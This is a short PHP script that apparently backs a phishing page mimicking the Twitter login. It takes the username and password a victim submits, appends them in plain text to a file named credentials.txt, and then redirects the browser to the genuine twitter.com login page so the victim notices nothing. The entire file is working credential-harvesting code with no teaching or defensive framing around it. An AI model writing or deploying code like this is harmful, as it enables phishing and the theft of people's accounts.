<?php
 $username = $_POST["text"];
 $password = $_POST["password"];
 echo "$text : " . $password;

 //Extract the credentials received
 $username = $_POST["text"];
 $password = $_POST["password"];
 //Write the credentials to text file
 $myfile = fopen("credentials.txt", "a") or die("Unable to open file!");
 //the username and password will be shown in the text file.
 $txt = "USERNAME = $username , PASSWORD = $password\n";
 //write the $myfile content to $txt
 fwrite($myfile, "\n". $txt);
// close the opened info.txt file
 fclose($myfile);
 //Redirect the browser to original login page
 header("Location: https://twitter.com/login");
 exit();
?>
